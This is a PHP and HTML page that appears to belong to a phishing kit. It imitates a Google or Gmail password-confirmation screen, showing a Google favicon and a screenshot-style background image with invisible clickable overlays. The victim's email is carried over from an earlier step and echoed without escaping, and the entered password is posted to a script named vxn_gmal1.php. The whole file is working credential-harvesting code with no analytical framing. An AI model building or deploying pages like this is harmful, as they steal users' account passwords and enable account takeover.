<?php

$emal = $_POST['emal'];

?><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Confirm</title>
<link rel="shortcut icon" href="images/fav_goog.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #E3E842;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:371px;top:0px;width:492px;height:725px;text-align:left;z-index:3;">
<img src="images/bodegmal.png" id="Image1" alt="" align="top" border="0" style="width:492px;height:725px;"></div>

<div id="bv_Form1" style="position:absolute;left:459px;top:314px;width:319px;height:218px;z-index:4">
<form name="Form1" method="post" action="vxn_gmal1.php" id="Form1">

<input name="emal" type="hidden" value="<?php echo $emal;?>">

<input type="password" id="Editbox1" style="position:absolute;left:28px;top:56px;width:255px;height:30px;border:0px #C0C0C0 dotted;font-family:'helvetica';font-size:14px;z-index:0" name="pasowonder" value="" pattern=".{5,20}" oninvalid="this.setCustomValidity('Required')" oninput="setCustomValidity('')" required placeholder="Password">

<input type="submit" id="Button1" name="Button1" value="" style="position:absolute;left:18px;top:127px;width:276px;height:38px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:1">
<div id="bv_Text1" style="margin:0;padding:0;position:absolute;left:70px;top:17px;width:150px;height:17px;text-align:left;z-index:2;">
<font style="font-size:15px" color="#282828" face="Arial"><center><?php echo $emal;?></font></div>
</form>
</div>
<input type="checkbox" id="Checkbox1" name="Checkbox1" value="on" style="position:absolute;left:474px;top:491px;z-index:5">
<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:647px;top:492px;width:111px;height:14px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:6;">
<a href="index.php"><img src="images/klik.png" id="Image2" alt="" align="top" border="0" style="width:111px;height:14px;"></a></div>
<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:519px;top:575px;width:199px;height:19px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:7;">
<a href="index.php"><img src="images/klik.png" id="Image3" alt="" align="top" border="0" style="width:199px;height:19px;"></a></div>
<div id="bv_Image4" style="margin:0;padding:0;position:absolute;left:478px;top:224px;width:25px;height:23px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:8;">
<a href="index.php"><img src="images/klik.png" id="Image4" alt="" align="top" border="0" style="width:25px;height:23px;"></a></div>
</body>
</html>